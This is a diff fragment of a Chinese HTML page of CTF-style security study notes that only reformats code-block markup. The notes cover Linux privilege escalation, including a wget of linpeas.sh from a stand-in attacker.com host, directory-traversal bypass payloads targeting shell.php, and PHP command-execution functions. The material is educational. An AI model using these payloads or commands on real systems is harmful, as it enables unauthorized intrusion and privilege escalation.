+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit linux kernel</span><br></pre></td></tr></table></figure>
 <p>3.上传提权工具（如 <code>linpeas.sh</code>）并运行：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">wget http://attacker.com/linpeas.sh<br>chmod +x linpeas.sh<br>./linpeas.sh<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget http://attacker.com/linpeas.sh</span><br><span class="line">chmod +x linpeas.sh</span><br><span class="line">./linpeas.sh</span><br></pre></td></tr></table></figure>
 <h3 id="读取-flag"><a class="markdownIt-Anchor" href="#读取-flag"></a> 读取 flag</h3>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">cat /path/to/flag<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /path/to/flag</span><br></pre></td></tr></table></figure>
 <h1 id="冬令营一些问题"><a class="markdownIt-Anchor" href="#冬令营一些问题"></a> 冬令营一些问题</h1>
 <blockquote>
 <p><strong>学习一下eval()的用法，什么叫做将字符串作为php代码执行（留意几个问题，单双引号转义问题以及语句末尾需要分号的问题都是新手很经常碰到的）</strong></p>
@@ -541,22 +541,22 @@
 <blockquote>
 <h5 id="目录穿越绕过方法"><a class="markdownIt-Anchor" href="#目录穿越绕过方法"></a> 目录穿越绕过方法</h5>
 <h6 id="双写"><a class="markdownIt-Anchor" href="#双写"></a> 双写 <code>..//</code></h6>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">..//..//..//../var/www/html/shell.php<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">..//..//..//../var/www/html/shell.php</span><br></pre></td></tr></table></figure>
 <h6 id="url-编码绕过"><a class="markdownIt-Anchor" href="#url-编码绕过"></a> URL 编码绕过</h6>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">..%2F..%2F..%2F..%2Fvar/www/html/shell.php<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">..%2F..%2F..%2F..%2Fvar/www/html/shell.php</span><br></pre></td></tr></table></figure>
 <p>服务器可能未对 <code>%2F</code>（URL 编码的 <code>/</code>）进行过滤，仍然解析目录穿越</p>
 <p>双重：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">%252e%252e%252f%252e%252e%252fshell.php<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%252e%252e%252f%252e%252e%252fshell.php</span><br></pre></td></tr></table></figure>
 <h6 id="截断绕过"><a class="markdownIt-Anchor" href="#截断绕过"></a> 截断绕过</h6>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">../../../shell.php%00.jpg<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../../../shell.php%00.jpg</span><br></pre></td></tr></table></figure>
 <h6 id="windows-反斜杠绕过"><a class="markdownIt-Anchor" href="#windows-反斜杠绕过"></a> Windows 反斜杠绕过</h6>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">..\..\shell.php<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">..\..\shell.php</span><br></pre></td></tr></table></figure>
 <h6 id="利用-procselfcwd-访问目标"><a class="markdownIt-Anchor" href="#利用-procselfcwd-访问目标"></a> 利用 <code>/proc/self/cwd/</code> 访问目标</h6>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">/proc/self/cwd/shell.php<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/proc/self/cwd/shell.php</span><br></pre></td></tr></table></figure>
 <p><code>/proc/self/cwd/</code> 是 Linux 系统中的一个虚拟路径，代表当前<strong>进程的工作目录</strong></p>
 <p>访问 <code>/proc/self/cwd/</code> 相当于访问 <code>/var/www/html/</code></p>
 <h6 id="利用环境变量绕过"><a class="markdownIt-Anchor" href="#利用环境变量绕过"></a> 利用环境变量绕过</h6>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">/var/www/html/$&#123;IFS&#125;shell.php<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/www/html/$&#123;IFS&#125;shell.php</span><br></pre></td></tr></table></figure>
 <p><code>$IFS</code> 是 Linux 的<strong>分隔符</strong>（通常为空格）</p>
 <p>某些 Shell 解析时可能会<strong>错误解析路径</strong>、</p>
 <h5 id="防御"><a class="markdownIt-Anchor" href="#防御"></a> 防御</h5>
@@ -590,18 +590,18 @@
 <p><code>eval()</code> 函数执行字符串中的 PHP 代码，虽然它不是直接执行操作系统命令，但如果攻击者能够控制字符串内容，就可以执行任意 PHP 代码，甚至是系统命令</p>
 <h5 id="exec"><a class="markdownIt-Anchor" href="#exec"></a> <code>exec()</code></h5>
 <p>用于执行外部程序，并返回执行结果。它可以执行任何操作系统命令</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">exec(&#x27;ls -la&#x27;);<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec(&#x27;ls -la&#x27;);</span><br></pre></td></tr></table></figure>
 <p>这个代码会执行 <code>ls -la</code> 命令，并将结果返回</p>
 <h5 id="system"><a class="markdownIt-Anchor" href="#system"></a> <code>system()</code></h5>
 <p><code>system()</code> 函数类似于 <code>exec()</code>，但它会直接输出命令执行的结果，而不是返回结果</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">system(&#x27;ls -la&#x27;);<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(&#x27;ls -la&#x27;);</span><br></pre></td></tr></table></figure>
 <h5 id="shell_exec"><a class="markdownIt-Anchor" href="#shell_exec"></a> <code>shell_exec()</code></h5>
 <p><code>shell_exec()</code> 函数用于执行命令，并返回输出结果。与 <code>exec()</code> 和 <code>system()</code> 不同的是，<code>shell_exec()</code> 返回的是命令的完整输出</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$output = shell_exec(&#x27;ls -la&#x27;);<br>echo $output;<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$output = shell_exec(&#x27;ls -la&#x27;);</span><br><span class="line">echo $output;</span><br></pre></td></tr></table></figure>
 <p>这个代码执行 <code>ls -la</code> 命令，并将结果作为字符串返回</p>
 <h5 id="passthru"><a class="markdownIt-Anchor" href="#passthru"></a> <code>passthru()</code></h5>
 <p><code>passthru()</code> 函数执行系统命令，并直接将命令的原始输出传递到浏览器，通常用于显示二进制数据，如图像或音频文件</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">passthru(&#x27;ls -la&#x27;);<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passthru(&#x27;ls -la&#x27;);</span><br></pre></td></tr></table></figure>
 <h5 id="proc_open"><a class="markdownIt-Anchor" href="#proc_open"></a> <code>proc_open()</code></h5>
 <p><code>proc_open()</code> 函数允许启动一个外部进程，并与该进程进行交互（读写）。它比 <code>exec()</code> 更强大，允许与外部命令进行复杂的通信</p>
 <h5 id="popen"><a class="markdownIt-Anchor" href="#popen"></a> <code>popen()</code></h5>
